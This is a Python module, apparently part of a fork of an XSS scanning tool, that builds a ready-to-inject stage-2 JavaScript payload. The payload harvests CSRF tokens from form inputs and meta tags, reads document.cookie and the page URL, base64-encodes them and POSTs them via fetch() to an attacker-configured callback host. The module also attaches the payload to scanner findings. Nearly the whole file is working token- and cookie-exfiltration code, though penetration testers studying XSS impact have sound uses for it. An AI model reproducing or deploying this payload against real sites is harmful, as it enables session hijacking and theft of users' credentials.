#!/usr/bin/env python3

"""
XSSChain CSRF Token Extraction Payload Generator

After a confirmed XSS finding, generates a stage-2 JavaScript payload that:
  - Reads the CSRF token from common DOM locations (input fields by name)
  - Reads the CSRF token from the <meta> tag's content attribute
  - Reads document.cookie (truncated to 500 chars)
  - Sends all three values via fetch() to the configured callback host

The payload uses btoa() and JSON.stringify() to encode values before sending,
so binary-safe transport is guaranteed even when tokens contain special chars.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Modified: xsschain fork
Telegram: https://t.me/EasyProTech
"""

from dataclasses import dataclass
from typing import Optional

from brsxss.utils.logger import Logger

logger = Logger("core.csrf_extractor")

# Common CSRF input field name selectors (querySelector CSS notation)
_CSRF_INPUT_SELECTORS: list[str] = [
    "input[name=csrf_token]",
    "input[name=_token]",
    "input[name=authenticity_token]",
    "input[name=csrfmiddlewaretoken]",
    "input[name=_csrf]",
    "input[name=csrf]",
    "input[name=_csrf_token]",
    "input[name=CSRFToken]",
    "input[name=requestVerificationToken]",
]

# Common CSRF meta tag selectors
_CSRF_META_SELECTORS: list[str] = [
    "meta[name=csrf-token]",
    "meta[name=_csrf]",
    "meta[name=csrf_token]",
    "meta[name=CSRFToken]",
    "meta[name=X-CSRF-Token]",
]


@dataclass
class CSRFExtractionPayload:
    """Container for a generated CSRF extraction payload"""

    payload: str
    callback_host: str
    stage: int = 2
    description: str = "CSRF token + cookie extraction stage-2 payload"


def _js_selector_list(selectors: list[str]) -> str:
    """Render a list of CSS selectors as a JS array literal."""
    quoted = ", ".join(f'"{s}"' for s in selectors)
    return f"[{quoted}]"


def build_csrf_extraction_payload(
    callback_host: str,
    extra_input_selectors: Optional[list[str]] = None,
    extra_meta_selectors: Optional[list[str]] = None,
) -> CSRFExtractionPayload:
    """
    Build a stage-2 XSS payload that extracts CSRF tokens and cookies.

    The generated payload:
      1. Iterates common CSRF input selectors to find a value.
      2. Iterates common CSRF meta selectors for a content attribute value.
      3. Reads document.cookie, truncated to 500 characters.
      4. Encodes the three values as a base64-encoded JSON object.
      5. POSTs the encoded blob to ``http(s)://{callback_host}/xsschain/csrf``.

    Args:
        callback_host: Interactsh host or --callback-host value (hostname or
                       scheme://hostname[:port]).  A bare hostname is promoted
                       to ``https://``.
        extra_input_selectors: Additional input CSS selectors to probe.
        extra_meta_selectors: Additional meta CSS selectors to probe.

    Returns:
        CSRFExtractionPayload with the ready-to-inject ``payload`` string.
    """
    if not callback_host:
        raise ValueError("callback_host must not be empty")

    if not callback_host.startswith(("http://", "https://")):
        callback_host = "https://" + callback_host

    input_selectors = list(_CSRF_INPUT_SELECTORS)
    if extra_input_selectors:
        input_selectors.extend(extra_input_selectors)

    meta_selectors = list(_CSRF_META_SELECTORS)
    if extra_meta_selectors:
        meta_selectors.extend(extra_meta_selectors)

    endpoint = callback_host.rstrip("/") + "/xsschain/csrf"

    input_sel_js = _js_selector_list(input_selectors)
    meta_sel_js = _js_selector_list(meta_selectors)

    # Inline JS – single-statement IIFE so it can be wrapped in any context.
    js_code = (
        "(function(){"
        # --- Read CSRF from input fields ---
        f"var inputSels={input_sel_js};"
        "var csrfInput=null;"
        "for(var i=0;i<inputSels.length;i++){"
        "var el=document.querySelector(inputSels[i]);"
        "if(el&&el.value){csrfInput=el.value;break;}"
        "}"
        # --- Read CSRF from meta tags ---
        f"var metaSels={meta_sel_js};"
        "var csrfMeta=null;"
        "for(var j=0;j<metaSels.length;j++){"
        "var m=document.querySelector(metaSels[j]);"
        "if(m&&m.getAttribute('content')){csrfMeta=m.getAttribute('content');break;}"
        "}"
        # --- Read cookies (truncated to 500 chars) ---
        "var cookieVal=(document.cookie||'').substring(0,500);"
        # --- Encode and POST to callback ---
        "var payload=btoa(JSON.stringify({"
        "csrf_input:csrfInput,"
        "csrf_meta:csrfMeta,"
        "cookie:cookieVal,"
        "origin:location.href"
        "}));"
        f"fetch('{endpoint}',{{"
        "method:'POST',"
        "mode:'no-cors',"
        "headers:{'Content-Type':'text/plain'},"
        "body:payload"
        "});"
        "})()"
    )

    logger.info(
        "Built CSRF extraction payload targeting callback=%s (%d input selectors, %d meta selectors)",
        endpoint,
        len(input_selectors),
        len(meta_selectors),
    )

    return CSRFExtractionPayload(
        payload=f"<script>{js_code}</script>",
        callback_host=callback_host,
    )


def attach_csrf_payload_to_finding(
    finding: dict,
    callback_host: str,
) -> dict:
    """
    Attach the CSRF extraction payload to an existing XSS finding dict.

    Adds ``csrf_extraction`` key with the stage-2 payload and metadata.

    Args:
        finding: Mutable vulnerability finding dict produced by XSSScanner.
        callback_host: Callback host for exfiltration (same as --callback-host).

    Returns:
        The same ``finding`` dict, modified in-place.
    """
    try:
        csrf_payload = build_csrf_extraction_payload(callback_host)
        finding["csrf_extraction"] = {
            "stage": csrf_payload.stage,
            "payload": csrf_payload.payload,
            "callback_host": csrf_payload.callback_host,
            "description": csrf_payload.description,
        }
        logger.debug(
            "CSRF extraction payload attached to finding for param=%s",
            finding.get("parameter", "?"),
        )
    except Exception as exc:
        logger.warning("Failed to build CSRF extraction payload: %s", exc)
    return finding
